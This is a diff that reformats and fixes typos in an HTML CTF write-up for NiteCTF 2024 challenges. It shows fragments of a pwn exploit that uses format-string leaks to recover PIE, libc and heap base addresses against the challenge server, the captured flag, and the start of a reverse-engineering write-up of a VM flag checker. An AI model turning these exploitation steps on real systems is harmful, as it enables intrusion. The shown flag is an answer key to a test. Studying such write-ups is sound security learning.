@@ -32,10 +32,10 @@
     __stack_chk_fail&#40;&#41;;
   &#125;
   return 0;</code></pre> <p>To start off, we first send a series of <code>&#37;p</code>&#39;s in our format string to leak values off the stack. From this, we can recover the PIE base address, the <code>libc</code> base address as well as the location of the <code>main&#40;&#41;</code> stackframe&#39;s return address. </p> <pre><code class=language-python >def send_format_string&#40;conn, payload&#41;:
-conn.sendlineafter&#40;b&quot;What gift do you want from santa\n&gt;&quot;, payload&#41; prefix &#61;
-b&quot;Santa brought you a &quot; response &#61; conn.recvline_startswith&#40;prefix&#41;&#91;len&#40;prefix&#41;
-:&#93; return response
-
+    conn.sendlineafter&#40;b&quot;What gift do you want from santa\n&gt;&quot;, payload&#41; 
+    prefix &#61; b&quot;Santa brought you a &quot; 
+    response &#61; conn.recvline_startswith&#40;prefix&#41;&#91;len&#40;prefix&#41;:&#93; 
+    return response
 
 def answer_continue&#40;conn, to_continue&#41;:
     answer &#61; b&quot;y&quot; if to_continue else b&quot;n&quot;
@@ -257,7 +257,7 @@ conn &#61; connect&#40;&quot;chaterine.chals.nitectf2024.live&quot;, 1337, ssl&#
 printf_response &#61; send_printf&#40;conn, b&quot;&#37;13&#36;p&quot;&#41;
 target_buffer &#61; int&#40;printf_response, 16&#41; - 0x148
 print&#40;&quot;&amp;TARGET_BUFFER&quot;, hex&#40;target_buffer&#41;&#41;</code></pre> <p>Next we create a sentinel buffer at the top of the heap to prevent top-chunk consolidation.</p> <pre><code class=language-python >create_message&#40;conn, 0, 0x80&#41;</code></pre>
-<p>By writing into this buffer, we can also abuse the second format string vulnerability to read a heap address which was was left in a register from a previous operation. This allows us to determine the base address of the heap.</p>
+<p>By writing into this buffer, we can also abuse the second format string vulnerability to read a heap address which was left in a register from a previous operation. This allows us to determine the base address of the heap.</p>
 <pre><code class=language-python >response &#61; write_message&#40;conn, 0, &quot;&#37;3&#36;p&quot;&#41;
 heap_base &#61; int&#40;response, 16&#41; &amp; &#40;&#40;pow&#40;2, 64&#41; - 1&#41; ^ 0xFFF&#41;
 print&#40;&quot;HEAP BASE:&quot;, hex&#40;heap_base&#41;&#41;</code></pre>
@@ -288,12 +288,12 @@ conn.interactive&#40;&#41;
 # nite&#123;P015on_IvY_m4h_G04t&#125;</code></pre>
 <h2 id=gate_keeping_rev ><a href="#gate_keeping_rev" class=header-anchor >Gate Keeping &#40;rev&#41;</a></h2>
 <p>This challenge implements a flag checker inside of a small virtual machine. As a general disclaimer, the original binary is stripped of any symbols, so all names assigned to functions, variables, registers and instructions below are ones I chose myself and likely won&#39;t line up with your names.</p>
-<p>The program begins with an unusual function prologue which Ghidra has a hard time dcompiling. Looking at the assembly we see that it repeatedly subtracts from <code>rsp</code> until a desired stackframe size is reached.</p>
+<p>The program begins with an unusual function prologue which Ghidra has a hard time decompiling. Looking at the assembly we see that it repeatedly subtracts from <code>rsp</code> until a desired stackframe size is reached.</p>
 <pre><code class=language-asm >001028b8     ENDBR64
 001028bc     PUSH       RBP
 001028bd     MOV        RBP,RSP
 001028c0     LEA        R11&#61;&gt;buffer.field271_0x110,&#91;RSP &#43; -0x8000&#93;
-         loop:                                            XREF&#91;1&#93;:     001028d7&#40;j&#41;  
+         loop:                                            XREF&#91;1&#93;:     001028d7&#40;j&#41;
 001028c8     SUB        RSP,0x1000
          
 001028cf     OR         qword ptr &#91;RSP&#93;&#61;&gt;buffer.field28943_0x7110,0x0
@@ -310,7 +310,7 @@ for &#40;i &#61; 0x1a7; i &#33;&#61; 0; i &#61; i &#43; -1&#41; &#123;
   program &#61; program &#43; &#40;ulong&#41;zero * -2 &#43; 1;
   instructions &#61; instructions &#43; &#40;ulong&#41;zero * -2 &#43; 1;
 &#125;</code></pre>
-<p>The program then enters into its main loop, where the instruction pointer of the virtual machine is incremented continuously whilst instructions are read, decoded and executed.</p>
+<p>The program then enters into its main loop, where the instruction pointer of the virtual machine is incremented continuously while instructions are read, decoded and executed.</p>
 <pre><code class=language-c >void main_loop&#40;vm_state *vm_state&#41;
 
 &#123;
